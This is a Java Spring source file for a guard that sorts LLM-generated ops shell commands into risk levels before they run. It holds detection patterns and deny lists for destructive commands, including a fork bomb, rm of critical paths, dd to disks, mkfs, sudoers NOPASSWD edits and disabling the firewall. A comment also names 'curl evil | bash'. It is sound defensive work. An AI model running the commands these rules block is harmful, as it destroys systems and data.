package com.zhiqian.ops.guard;

import org.springframework.stereotype.Component;

import java.net.URLDecoder;
import java.nio.charset.StandardCharsets;
import java.text.Normalizer;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * 意图风险校验器：对大模型生成的原始指令做"二次过滤"。
 * 裁决顺序：输入规范化 -> 高危元字符红线 -> 红线正则 -> 管道分段逐段裁决 ->
 * 参数/子命令级风险 -> 上下文升级 -> 只读白名单 -> 默认人工确认。
 *
 * 管道感知（P0-2）：真实模型常生成 {@code ps aux | grep java}、{@code cat x | tail} 等
 * 由只读命令拼接的管道。旧实现把所有 shell 元字符一刀切 BLOCK，会误杀这类完全只读的诊断命令。
 * 现按管道/连接符（| ; &）拆段逐段裁决、取最高风险：全段只读 -> READONLY 放行；任一段越权/危险
 * -> 升级为对应等级。而命令替换/重定向/换行（` $( ${ &gt; &lt; \n）仍属无条件红线，不可借分段规避。
 */
@Component
public class IntentRiskGuard {
    /** 管道/连接符：作为分段边界而非直接红线（|、;、&，含 ||、&&）。 */
    private static final Set<String> PIPELINE_SEPARATORS = Set.of("|", ";", "&");

    /**
     * shell 解释器 / 命令执行器：管道任一段流向它们即可执行任意代码
     * （经典 {@code curl evil | bash}、{@code ... | sh}、{@code | xargs rm} 攻击），一律红线 BLOCK。
     */
    private static final Set<String> SHELL_INTERPRETERS = Set.of(
            "sh", "bash", "dash", "zsh", "ksh", "csh", "tcsh", "ash", "fish",
            "python", "python2", "python3", "perl", "ruby", "node", "nodejs", "php", "lua",
            "eval", "exec", "source", "xargs", "env");

    private static final List<IntentRule> INTENT_DENY_RULES = List.of(
            new IntentRule(Pattern.compile("(?is)(?:\\b(?:rm|rmdir|delete|remove|clean|wipe|erase|destroy|purge|format)\\b|删除|删掉|删了|清理|清空|移除|干掉|抹掉|格式化|摧毁|销毁).{0,80}(?:/var/lib/(?:mysql|pgsql|postgresql|docker)(?:\\b|/)|/(?:etc|boot)(?:\\b|/)|/(?:\\s|$)|根目录)|(?:/var/lib/(?:mysql|pgsql|postgresql|docker)(?:\\b|/)|/(?:etc|boot)(?:\\b|/)|根目录).{0,80}(?:\\b(?:rm|rmdir|delete|remove|clean|wipe|erase|destroy|purge)\\b|删除|删掉|删了|移除|干掉|抹掉|格式化|摧毁|销毁)", Pattern.CASE_INSENSITIVE), "destructiveCriticalPathIntent", "Request deletes a protected system or data directory"),
            new IntentRule(Pattern.compile("(?is)\\bdd\\b.{0,200}\\bof\\s*=\\s*/dev/(?:sd[a-z]+|nvme\\d+n\\d+|vd[a-z]+|xvd[a-z]+)(?:\\b|/)", Pattern.CASE_INSENSITIVE), "rawDeviceWriteIntent", "Request writes directly to a block device"),
            new IntentRule(Pattern.compile("(?is)\\b(?:mkfs(?:\\.\\w+)?|wipefs|shred)\\b.{0,120}/dev/", Pattern.CASE_INSENSITIVE), "filesystemDestructionIntent", "Request destroys a filesystem or device"),
            new IntentRule(Pattern.compile(":\\s*\\(\\s*\\)\\s*\\{\\s*:\\s*\\|\\s*:\\s*&\\s*}\\s*;\\s*:", Pattern.CASE_INSENSITIVE), "forkBombIntent", "Request contains a fork bomb"),
            new IntentRule(Pattern.compile("(?is)fork\\s*(?:炸弹|bomb)|:\\s*\\(\\s*\\)\\s*\\{|(?:写|制造|制作|生成|搞|弄|来).{0,14}(?:占满|跑满|吃满|打满|耗尽).{0,6}(?:cpu|内存|资源)", Pattern.CASE_INSENSITIVE), "resourceExhaustionIntent", "Request intends a fork bomb or CPU/memory exhaustion"),
            new IntentRule(Pattern.compile("(?is)(?:\\b(?:write|modify|edit|append|add)\\b|写入|修改|追加|添加).{0,100}/etc/sudoers(?:\\.d/\\S+)?|/etc/sudoers(?:\\.d/\\S+)?.{0,100}(?:NOPASSWD|写入|修改|追加|添加)", Pattern.CASE_INSENSITIVE), "privilegeEscalationIntent", "Request modifies sudoers or grants elevated privileges"),
            new IntentRule(Pattern.compile("(?is)\\bchmod\\s+(?:-R\\s+)?0?777\\s+/(?:\\s|$)|(?:chmod|权限).{0,80}(?:777|全权限).{0,80}(?:根目录|/)"), "rootPermissionIntent", "Request grants unsafe permissions on the root filesystem"));

    private static final Pattern OUTPUT_REDIRECTION = Pattern.compile("(?<![<>=])(?:\\d?)(>>?)\\s*([^\\s;|&]+)");
    /**
     * 大模型常在运维命令前自行添加 sudo，但权限边界应由最小权限执行器统一管理。
     * 这里只剥离无身份切换能力的普通前缀（sudo / sudo -n / sudo --）；
     * sudo -u/-g 等主动指定身份的形式不做规范化，后续按高风险包装器拒绝。
     */
    private static final Pattern SAFE_SUDO_PREFIX = Pattern.compile(
            "(?i)^\\s*(?:/usr/bin/)?sudo\\s+(?:(?:-n)\\s+)?(?:--\\s+)?(?=[A-Za-z0-9_./])");

    /**
     * 同形字（confusables）映射：Cyrillic / Greek 等与 ASCII 字母形近的字符 → ASCII，
     * 堵住「用西里尔字母伪装 rm/dd 绕过红线正则」的同形字混淆攻击。NFKC 不处理跨字形混淆，需显式映射。
     */
    private static final Map<Character, Character> HOMOGLYPHS = Map.ofEntries(
            Map.entry('а', 'a'), Map.entry('е', 'e'), Map.entry('о', 'o'),
            Map.entry('р', 'p'), Map.entry('с', 'c'), Map.entry('у', 'y'),
            Map.entry('х', 'x'), Map.entry('і', 'i'), Map.entry('ј', 'j'),
            Map.entry('ѕ', 's'),
            Map.entry('А', 'A'), Map.entry('Е', 'E'), Map.entry('О', 'O'),
            Map.entry('Р', 'P'), Map.entry('С', 'C'), Map.entry('Т', 'T'),
            Map.entry('Х', 'X'), Map.entry('К', 'K'), Map.entry('М', 'M'),
            Map.entry('Н', 'H'), Map.entry('В', 'B'),
            Map.entry('ο', 'o'), Map.entry('α', 'a'), Map.entry('ε', 'e'),
            Map.entry('ρ', 'p'), Map.entry('τ', 't'), Map.entry('ν', 'v'),
            Map.entry('Ι', 'I'), Map.entry('Ο', 'O'), Map.entry('Ρ', 'P'));

    private final GuardRules rules;
    private final List<Pattern> blockedPatterns = new ArrayList<>();
    private final List<String> blockedReasons = new ArrayList<>();
    /** 无条件红线元字符：命令替换/重定向/换行，不可通过分段放行。 */
    private final List<String> hardBlockedMetacharacters = new ArrayList<>();

    public IntentRiskGuard(RiskRuleLoader loader) {
        this.rules = loader.rules();
        for (GuardRules.BlockedPattern bp : rules.getBlockedPatterns()) {
            blockedPatterns.add(Pattern.compile(bp.getPattern(), Pattern.CASE_INSENSITIVE));
            blockedReasons.add(bp.getReason());
        }
        for (String mc : rules.getBlockedMetacharacters()) {
            if (!PIPELINE_SEPARATORS.contains(mc)) {
                hardBlockedMetacharacters.add(mc);
            }
        }
    }

    public RiskDecision evaluate(String command) {
        if (command == null || command.isBlank()) {
            return new RiskDecision(command, RiskLevel.BLOCK, "空指令", "empty");
        }
        String cmd = command.trim();
        String normalized = normalizeCommand(cmd);
        String guardInput = normalized.isBlank() ? cmd : normalized;

        // 1. 高危元字符红线：命令替换/重定向/换行，无条件 BLOCK（不可借分段规避）
        for (String mc : hardBlockedMetacharacters) {
            if (guardInput.contains(mc)) {
                return new RiskDecision(cmd, RiskLevel.BLOCK,
                        "包含禁止的 shell 元字符 '" + mc + "'，可能用于命令替换/重定向/注入", "metacharacter");
            }
        }

        // 2. 红线正则（作用于整串，防止分段规避 rm -rf / 等）
        for (int i = 0; i < blockedPatterns.size(); i++) {
            if (blockedPatterns.get(i).matcher(guardInput).find()) {
                return new RiskDecision(cmd, RiskLevel.BLOCK, blockedReasons.get(i), "blockedPattern");
            }
        }

        RiskDecision redirectionDecision = evaluateOutputRedirection(cmd, guardInput);
        if (redirectionDecision != null) return redirectionDecision;

        // 3. 管道/连接符分段：逐段裁决取最高风险（全段只读则整体 READONLY 放行）
        List<String> segments = splitPipeline(guardInput);
        if (segments.size() > 1) {
            // 3a. 管道流向 shell 解释器 / 命令执行器 -> 可执行任意代码，红线 BLOCK
            for (String seg : segments) {
                if (seg.isBlank()) {
                    continue;
                }
                List<String> segArgv = tokenize(seg);
                if (!segArgv.isEmpty() && SHELL_INTERPRETERS.contains(basename(segArgv.get(0)))) {
                    return new RiskDecision(cmd, RiskLevel.BLOCK,
                            "管道向 shell 解释器/命令执行器（" + basename(segArgv.get(0)) + "）传递，可执行任意代码",
                            "pipeToInterpreter");
                }
            }
            RiskLevel worst = RiskLevel.READONLY;
            RiskDecision worstDecision = null;
            for (String seg : segments) {
                if (seg.isBlank()) {
                    continue;
                }
                RiskDecision segDecision = evaluateSingle(cmd, seg);
                if (worstDecision == null || segDecision.level().severity() > worst.severity()) {
                    worstDecision = segDecision;
                }
                worst = RiskLevel.max(worst, segDecision.level());
            }
            if (worstDecision == null) {
                return new RiskDecision(cmd, RiskLevel.BLOCK, "无法解析管道指令", "unparseable");
            }
            String reason = worst == RiskLevel.READONLY
                    ? "管道由只读命令拼接，整体只读放行"
                    : "管道按最高风险段裁决：" + worstDecision.reason();
            return new RiskDecision(cmd, worst, reason, worstDecision.matchedRule());
        }

        return evaluateSingle(cmd, guardInput);
    }

    public RiskDecision evaluateIntent(String instruction) {
        if (instruction == null || instruction.isBlank()) return null;
        String normalized = normalizeCommand(instruction);
        for (IntentRule rule : INTENT_DENY_RULES) {
            if (rule.pattern().matcher(normalized).find()) return new RiskDecision(instruction, RiskLevel.BLOCK, rule.reason(), rule.id());
        }
        return null;
    }

    /**
     * 将模型候选命令规范化为由执行器接管权限的形式，避免 "sudo systemctl ..." 让护栏
     * 只看到最外层 sudo。该方法只接受安全的普通 sudo 前缀，不接受 -u/-g 等身份切换参数。
     */
    public String canonicalizeModelCommand(String command) {
        if (command == null || command.isBlank()) return command;
        Matcher matcher = SAFE_SUDO_PREFIX.matcher(command);
        return matcher.find() ? command.substring(matcher.end()).trim() : command.trim();
    }

    /**
     * 原始意图明确要求变更核心服务时，为模型候选命令设置不可降低的风险下限。
     * 只升级已经被判定为变更的、且确实指向同一服务的命令；status/is-active 等只读命令不升级。
     */
    public RiskDecision enforceCriticalServiceIntentFloor(String instruction, RiskDecision decision) {
        if (decision == null || decision.level() == RiskLevel.BLOCK
                || decision.level() == RiskLevel.READONLY || decision.level() == RiskLevel.IRREVERSIBLE) {
            return decision;
        }
        String service = requestedCriticalServiceChange(instruction);
        if (service == null || !commandMentionsService(decision.command(), service)) {
            return decision;
        }
        List<String> matched = new ArrayList<>(decision.matchedRules());
        if (!matched.contains("criticalServiceIntent")) matched.add("criticalServiceIntent");
        List<String> reasons = new ArrayList<>(decision.reasons());
        reasons.add("原始意图明确要求变更核心服务（" + service + "），风险等级不得由模型命令写法降级");
        return new RiskDecision(decision.command(), RiskLevel.IRREVERSIBLE,
                DecisionAction.REQUIRE_APPROVAL, true, true, true,
                matched, reasons, "先完成服务状态与配置检查，建立恢复点后再执行强确认。",
                decision.normalizedInput(), decision.originalInputHash());
    }

    private RiskDecision evaluateOutputRedirection(String cmd, String input) {
        Matcher matcher = OUTPUT_REDIRECTION.matcher(input);
        while (matcher.find()) {
            String target = matcher.group(2);
            if (target == null || target.isBlank() || target.startsWith("&") || "/dev/null".equals(target)) continue;
            RiskLevel level = touchesCriticalPath(List.of(target)) ? RiskLevel.IRREVERSIBLE : RiskLevel.EXECUTABLE;
            return new RiskDecision(cmd, level, "Output redirection writes to " + target + " and requires review", "outputRedirection");
        }
        return null;
    }

    /** 对单条（已分段、无管道）命令裁决。 */
    private RiskDecision evaluateSingle(String cmd, String segmentInput) {
        List<String> argv = tokenize(segmentInput);
        if (argv.isEmpty()) {
            return new RiskDecision(cmd, RiskLevel.BLOCK, "无法解析指令", "unparseable");
        }
        String binary = basename(argv.get(0));
        if ("sudo".equalsIgnoreCase(binary)) {
            String inner = canonicalizeModelCommand(segmentInput);
            if (inner == null || inner.equals(segmentInput.trim())) {
                return new RiskDecision(cmd, RiskLevel.BLOCK,
                        "模型命令不得通过 sudo 指定执行身份或附加提权参数，权限必须由最小权限执行器统一管理",
                        "privilegeWrapper");
            }
            argv = tokenize(inner);
            if (argv.isEmpty()) {
                return new RiskDecision(cmd, RiskLevel.BLOCK, "sudo 后缺少实际命令", "privilegeWrapper");
            }
            binary = basename(argv.get(0));
        }
        RiskDecision commandSurfaceDecision = evaluateCommandSurface(cmd, argv, binary);
        if (commandSurfaceDecision != null) {
            return commandSurfaceDecision;
        }
        boolean mutating = rules.getReviewBinaries().contains(binary);

        // 关键路径上的变更类操作 -> 升级为 IRREVERSIBLE，红线已在前置规则中 BLOCK
        if (mutating && touchesCriticalPath(argv)) {
            return new RiskDecision(cmd, RiskLevel.IRREVERSIBLE,
                    "在系统关键路径/数据库数据目录上执行变更操作（" + binary + "），需人工确认并执行前备份",
                    "criticalPath");
        }
        if (mutating && touchesCriticalService(argv)) {
            return new RiskDecision(cmd, RiskLevel.IRREVERSIBLE,
                    "命中核心服务变更（" + binary + "），需人工确认、dry-run 与执行前影响记录",
                    "criticalService");
        }

        // 变更类二进制 -> EXECUTABLE
        if (mutating) {
            return new RiskDecision(cmd, RiskLevel.EXECUTABLE,
                    "可逆/受限变更操作（" + binary + "）需人工确认或 dry-run", "reviewBinary");
        }

        // 只读白名单 -> READONLY
        if (rules.getReadOnlyBinaries().contains(binary)) {
            return new RiskDecision(cmd, RiskLevel.READONLY, "只读/感知类指令", "readOnly");
        }

        // 未知二进制 -> 默认 EXECUTABLE（最小信任原则，需要人工确认）
        return new RiskDecision(cmd, RiskLevel.EXECUTABLE,
                "未在白名单内的指令（" + binary + "），默认需人工确认", "unknown");
    }

    /** /etc/passwd 可用于只读账户排查，但任何原地改写都属于系统账户红线。 */
    /**
     * 引号感知的管道/连接符分段：仅在引号外遇到 | ; &amp; 时切分，
     * 引号内的元字符（如 {@code sed 's/a|b/c/'}）不切分。
     */
    private List<String> splitPipeline(String s) {
        List<String> segments = new ArrayList<>();
        StringBuilder cur = new StringBuilder();
        char quote = 0;
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            if (quote != 0) {
                if (c == quote) { quote = 0; }
                cur.append(c);
            } else if (c == '\'' || c == '"') {
                quote = c;
                cur.append(c);
            } else if (c == '&' && i > 0 && s.charAt(i - 1) == '>') {
                cur.append(c);
            } else if (c == '|' || c == ';' || c == '&') {
                segments.add(cur.toString().trim());
                cur.setLength(0);
            } else {
                cur.append(c);
            }
        }
        segments.add(cur.toString().trim());
        return segments;
    }

    private boolean touchesCriticalPath(List<String> argv) {
        for (String tok : argv) {
            if (!tok.startsWith("/")) {
                continue;
            }
            String norm = tok.endsWith("/") && tok.length() > 1 ? tok.substring(0, tok.length() - 1) : tok;
            for (String cp : rules.getCriticalPaths()) {
                if (cp.equals("/")) {
                    if (norm.equals("/") || tok.equals("/*")) {
                        return true;
                    }
                } else if (norm.equals(cp) || norm.startsWith(cp + "/")) {
                    return true;
                }
            }
        }
        return false;
    }

    private boolean touchesCriticalService(List<String> argv) {
        if (rules.getCriticalServices().isEmpty()) {
            return false;
        }
        for (String tok : argv) {
            String normalized = basename(tok).toLowerCase(Locale.ROOT);
            for (String svc : rules.getCriticalServices()) {
                if (normalized.equals(svc.toLowerCase(Locale.ROOT))
                        || normalized.equals(svc.toLowerCase(Locale.ROOT) + ".service")) {
                    return true;
                }
            }
        }
        return false;
    }

    private String requestedCriticalServiceChange(String instruction) {
        if (instruction == null || instruction.isBlank() || rules.getCriticalServices().isEmpty()) return null;
        String normalized = normalizeCommand(instruction).toLowerCase(Locale.ROOT);
        boolean chineseRequest = Pattern.compile(
                "(?is)(?:帮我|请|执行|立即|马上|直接|需要|要求).{0,24}(?:重启|启动|停止|重载|重新加载)")
                .matcher(normalized).find();
        boolean commandStyle = Pattern.compile("(?is)\\b(?:restart|start|stop|reload)\\b")
                .matcher(normalized).find();
        if (!chineseRequest && !commandStyle) return null;
        for (String service : rules.getCriticalServices()) {
            String lower = service.toLowerCase(Locale.ROOT);
            if (normalized.contains(lower) || normalized.contains(lower + ".service")) return lower;
        }
        return null;
    }

    private boolean commandMentionsService(String command, String service) {
        if (command == null || service == null) return false;
        for (String token : tokenize(canonicalizeModelCommand(command))) {
            String normalized = basename(token).toLowerCase(Locale.ROOT);
            if (normalized.equals(service) || normalized.equals(service + ".service")) return true;
        }
        return false;
    }

    private RiskDecision evaluateCommandSurface(String cmd, List<String> argv, String binary) {
        return switch (binary) {
            case "systemctl" -> evaluateSystemctl(cmd, argv);
            case "service" -> evaluateService(cmd, argv);
            case "nginx" -> evaluateNginx(cmd, argv);
            case "firewall-cmd" -> evaluateFirewallCmd(cmd, argv);
            case "find" -> evaluateFind(cmd, argv);
            case "docker" -> evaluateDocker(cmd, argv);
            case "kubectl" -> evaluateKubectl(cmd, argv);
            case "crontab" -> evaluateCrontab(cmd, argv);
            case "sed" -> evaluateSed(cmd, argv);
            case "tar" -> evaluateTar(cmd, argv);
            case "rsync" -> evaluateRsync(cmd, argv);
            case "ip" -> evaluateIp(cmd, argv);
            case "route" -> evaluateRoute(cmd, argv);
            case "ifconfig" -> evaluateIfconfig(cmd, argv);
            case "wmic" -> evaluateWmic(cmd, argv);
            case "strace" -> evaluateStrace(cmd, argv);
            case "taskkill" -> new RiskDecision(cmd, RiskLevel.EXECUTABLE,
                    "taskkill 会终止 Windows 进程，需人工确认", "taskkillMutating");
            default -> null;
        };
    }

    private RiskDecision evaluateSystemctl(String cmd, List<String> argv) {
        String sub = firstNonOption(argv, 1);
        if (sub != null && List.of("status", "is-active", "is-enabled", "show", "list-units", "list-unit-files", "list-dependencies", "cat").contains(sub.toLowerCase(Locale.ROOT))) return new RiskDecision(cmd, RiskLevel.READONLY, "systemctl query subcommand", "systemctlReadOnly");
        // 停用/禁用/屏蔽防火墙类服务（firewalld/ufw/iptables/nftables）等同于主动关闭安全防线，
        // 对齐 MITRE ATT&CK T1562.004（Disable or Modify System Firewall）：一律红线拒绝，
        // 不可通过人工确认放行——这不是"高风险但可能是合法运维需求"，而是攻击链的经典前置动作。
        if (sub != null && List.of("stop", "disable", "mask").contains(sub.toLowerCase(Locale.ROOT)) && touchesSecurityService(argv)) return new RiskDecision(cmd, RiskLevel.BLOCK, "禁止停用/禁用安全防护服务（防火墙），命中安全红线", "systemctlSecurityServiceChange");
        return null;
    }
    private RiskDecision evaluateService(String cmd, List<String> argv) {
        if ("status".equalsIgnoreCase(firstNonOption(argv, 2))) return new RiskDecision(cmd, RiskLevel.READONLY, "service status query", "serviceReadOnly");
        return null;
    }
    private RiskDecision evaluateNginx(String cmd, List<String> argv) {
        if (containsAny(argv, "-t", "-T", "-v", "-V", "-h", "--help")) return new RiskDecision(cmd, RiskLevel.READONLY, "nginx configuration or version query", "nginxReadOnly");
        return new RiskDecision(cmd, RiskLevel.EXECUTABLE, "nginx invocation may change service state", "nginxUnknown");
    }
    private RiskDecision evaluateFirewallCmd(String cmd, List<String> argv) {
        for (String arg : argv) { String option = arg.toLowerCase(Locale.ROOT); if (option.startsWith("--list") || option.equals("--state") || option.startsWith("--get-") || option.startsWith("--query-") || option.equals("--help") || option.equals("--version")) return new RiskDecision(cmd, RiskLevel.READONLY, "firewall-cmd query", "firewallCmdReadOnly"); }
        return new RiskDecision(cmd, RiskLevel.EXECUTABLE, "firewall-cmd may change firewall rules", "firewallCmdMutating");
    }

    private RiskDecision evaluateFind(String cmd, List<String> argv) {
        for (String arg : argv) {
            if ("-delete".equals(arg) || "-exec".equals(arg) || "-execdir".equals(arg)
                    || "-ok".equals(arg) || "-okdir".equals(arg)
                    || arg.startsWith("-fprint") || "-fls".equals(arg)) {
                return new RiskDecision(cmd, RiskLevel.BLOCK,
                        "find 参数包含删除、执行或写文件动作（" + arg + "），只读白名单不得放行",
                        "findMutatingAction");
            }
        }
        return null;
    }

    private RiskDecision evaluateDocker(String cmd, List<String> argv) {
        String sub = firstNonOption(argv, 1);
        if (sub == null) {
            return null;
        }
        if (List.of("ps", "images", "logs", "inspect", "version", "info", "stats").contains(sub)) {
            return new RiskDecision(cmd, RiskLevel.READONLY, "docker 只读查询子命令", "dockerReadOnly");
        }
        if (List.of("rm", "kill", "stop", "prune", "rmi", "restart", "compose").contains(sub)) {
            return new RiskDecision(cmd, RiskLevel.EXECUTABLE, "docker 变更类子命令需人工确认", "dockerMutatingSubcommand");
        }
        return null;
    }

    private RiskDecision evaluateKubectl(String cmd, List<String> argv) {
        String sub = firstNonOption(argv, 1);
        if (sub == null) {
            return null;
        }
        if (List.of("get", "describe", "logs", "top", "version", "cluster-info", "api-resources", "api-versions").contains(sub)) {
            return new RiskDecision(cmd, RiskLevel.READONLY, "kubectl 只读查询子命令", "kubectlReadOnly");
        }
        if (List.of("delete", "apply", "patch", "edit", "drain", "scale", "replace", "rollout").contains(sub)) {
            return new RiskDecision(cmd, RiskLevel.EXECUTABLE, "kubectl 变更类子命令需人工确认", "kubectlMutatingSubcommand");
        }
        return null;
    }

    private RiskDecision evaluateCrontab(String cmd, List<String> argv) {
        if (argv.contains("-r") || argv.contains("-e")) {
            return new RiskDecision(cmd, RiskLevel.EXECUTABLE, "crontab 修改/删除计划任务需人工确认", "crontabMutatingOption");
        }
        if (argv.contains("-l")) {
            return new RiskDecision(cmd, RiskLevel.READONLY, "crontab 只读列出计划任务", "crontabReadOnly");
        }
        return null;
    }

    private RiskDecision evaluateSed(String cmd, List<String> argv) {
        for (String arg : argv) {
            if ("-i".equals(arg) || arg.startsWith("-i.")) {
                return touchesCriticalPath(argv)
                        ? new RiskDecision(cmd, RiskLevel.IRREVERSIBLE, "sed -i 修改系统关键路径文件，需执行前备份并人工确认", "criticalPath")
                        : new RiskDecision(cmd, RiskLevel.EXECUTABLE, "sed -i 会原地修改文件，需人工确认", "sedInPlace");
            }
        }
        return new RiskDecision(cmd, RiskLevel.READONLY, "sed 未启用原地修改，按文本只读处理", "sedReadOnly");
    }

    private RiskDecision evaluateTar(String cmd, List<String> argv) {
        boolean extract = false;
        boolean listOnly = false;
        for (int i = 1; i < argv.size(); i++) {
            String arg = argv.get(i);
            if (i > 1 && !arg.startsWith("-")) {
                continue;
            }
            String opt = arg.startsWith("--") ? arg.substring(2) : (arg.startsWith("-") ? arg.substring(1) : arg);
            boolean clusteredShortOptions = opt.matches("[A-Za-z]+");
            if ("-x".equals(arg) || arg.startsWith("-x") || arg.startsWith("--extract")
                    || (clusteredShortOptions && opt.indexOf('x') >= 0)) {
                extract = true;
            }
            if ("-t".equals(arg) || arg.startsWith("-t") || arg.startsWith("--list")
                    || (clusteredShortOptions && opt.indexOf('t') >= 0)) {
                listOnly = true;
            }
        }
        if (extract) {
            return touchesCriticalPath(argv)
                    ? new RiskDecision(cmd, RiskLevel.IRREVERSIBLE, "tar 解压目标触及系统关键路径，可能覆盖文件，需执行前备份", "criticalPath")
                    : new RiskDecision(cmd, RiskLevel.EXECUTABLE, "tar 解压可能覆盖写入文件，需人工确认", "tarExtract");
        }
        if (listOnly) {
            return new RiskDecision(cmd, RiskLevel.READONLY, "tar 只列出归档内容", "tarReadOnly");
        }
        return null;
    }

    private RiskDecision evaluateRsync(String cmd, List<String> argv) {
        if (argv.contains("--dry-run") || argv.contains("-n")) {
            return new RiskDecision(cmd, RiskLevel.READONLY, "rsync dry-run 只预演不写入", "rsyncDryRun");
        }
        return touchesCriticalPath(argv)
                ? new RiskDecision(cmd, RiskLevel.IRREVERSIBLE, "rsync 覆盖同步目标触及系统关键路径，需执行前备份", "criticalPath")
                : new RiskDecision(cmd, RiskLevel.EXECUTABLE, "rsync 可能覆盖写入目标文件，需人工确认", "rsyncMutating");
    }

    private RiskDecision evaluateIp(String cmd, List<String> argv) {
        String sub = firstNonOption(argv, 1);
        if (sub == null) {
            return new RiskDecision(cmd, RiskLevel.READONLY, "ip 帮助/概览查询", "ipReadOnly");
        }
        if (containsAny(argv, "add", "del", "delete", "set", "replace", "change", "flush")) {
            return new RiskDecision(cmd, RiskLevel.EXECUTABLE, "ip 网络配置变更需人工确认", "ipMutatingSubcommand");
        }
        if (List.of("addr", "address", "a", "route", "r", "link", "l", "neigh", "neighbour", "neighbor", "n").contains(sub)) {
            return new RiskDecision(cmd, RiskLevel.READONLY, "ip 网络状态查询子命令", "ipReadOnly");
        }
        return new RiskDecision(cmd, RiskLevel.EXECUTABLE, "未知 ip 子命令默认需人工确认", "ipUnknownSubcommand");
    }

    private RiskDecision evaluateRoute(String cmd, List<String> argv) {
        if (containsAny(argv, "add", "del", "delete", "change", "flush")) {
            return new RiskDecision(cmd, RiskLevel.EXECUTABLE, "route 路由表变更需人工确认", "routeMutatingSubcommand");
        }
        return new RiskDecision(cmd, RiskLevel.READONLY, "route 路由表查询", "routeReadOnly");
    }

    private RiskDecision evaluateIfconfig(String cmd, List<String> argv) {
        if (containsAny(argv, "up", "down", "netmask", "broadcast", "mtu", "add", "del", "delete")) {
            return new RiskDecision(cmd, RiskLevel.EXECUTABLE, "ifconfig 网卡配置变更需人工确认", "ifconfigMutatingOption");
        }
        return new RiskDecision(cmd, RiskLevel.READONLY, "ifconfig 网卡状态查询", "ifconfigReadOnly");
    }

    private RiskDecision evaluateWmic(String cmd, List<String> argv) {
        if (containsAny(argv, "call", "create", "delete", "set")) {
            return new RiskDecision(cmd, RiskLevel.EXECUTABLE, "wmic 调用/创建/删除/设置对象需人工确认", "wmicMutatingVerb");
        }
        return new RiskDecision(cmd, RiskLevel.READONLY, "wmic 查询类命令", "wmicReadOnly");
    }

    private RiskDecision evaluateStrace(String cmd, List<String> argv) {
        if (containsAny(argv, "-V", "--version", "-h", "--help")) {
            return new RiskDecision(cmd, RiskLevel.READONLY, "strace 帮助/版本查询", "straceReadOnly");
        }
        return new RiskDecision(cmd, RiskLevel.EXECUTABLE,
                "strace 会启动或附加到进程并暴露调用细节，需人工确认", "straceAttachOrExecute");
    }

    private boolean containsAny(List<String> argv, String... values) {
        for (String arg : argv) {
            for (String value : values) {
                if (arg.equalsIgnoreCase(value)) {
                    return true;
                }
            }
        }
        return false;
    }

    private boolean touchesSecurityService(List<String> argv) {
        for (String tok : argv) { String unit = basename(tok).toLowerCase(Locale.ROOT); if (List.of("firewalld", "firewalld.service", "ufw", "ufw.service", "iptables", "nftables").contains(unit)) return true; }
        return false;
    }

    private String firstNonOption(List<String> argv, int from) {
        for (int i = from; i < argv.size(); i++) {
            String arg = argv.get(i);
            if (!arg.startsWith("-")) {
                return arg;
            }
        }
        return null;
    }

    /** 简易、安全的分词：仅按空白切分并处理引号，不做任何 shell 解释。 */
    private List<String> tokenize(String s) {
        List<String> out = new ArrayList<>();
        StringBuilder cur = new StringBuilder();
        char quote = 0;
        boolean has = false;
        for (char c : s.trim().toCharArray()) {
            if (quote != 0) {
                if (c == quote) { quote = 0; } else { cur.append(c); }
                has = true;
            } else if (c == '\'' || c == '"') {
                quote = c;
                has = true;
            } else if (Character.isWhitespace(c)) {
                if (has) { out.add(cur.toString()); cur.setLength(0); has = false; }
            } else {
                cur.append(c);
                has = true;
            }
        }
        if (has) { out.add(cur.toString()); }
        return out;
    }

    private String basename(String token) {
        int idx = token.lastIndexOf('/');
        return idx >= 0 ? token.substring(idx + 1) : token;
    }

    private String normalizeCommand(String text) {
        String s = Normalizer.normalize(text, Normalizer.Form.NFKC)
                .replaceAll("[\\p{Cntrl}\\u200B\\u200C\\u200D\\uFEFF]", "");
        s = mapHomoglyphs(s);
        try {
            s = URLDecoder.decode(s, StandardCharsets.UTF_8);
        } catch (IllegalArgumentException ignored) {
            // Keep the NFKC form if percent decoding is malformed.
        }
        return s.replaceAll("\\s+", " ").trim();
    }

    /** 将同形字（Cyrillic/Greek 混淆字符）折叠回 ASCII，消除同形字绕过。 */
    private String mapHomoglyphs(String s) {
        StringBuilder sb = new StringBuilder(s.length());
        boolean changed = false;
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            Character mapped = HOMOGLYPHS.get(c);
            if (mapped != null) {
                sb.append(mapped.charValue());
                changed = true;
            } else {
                sb.append(c);
            }
        }
        return changed ? sb.toString() : s;
    }

    private record IntentRule(Pattern pattern, String id, String reason) {}
}
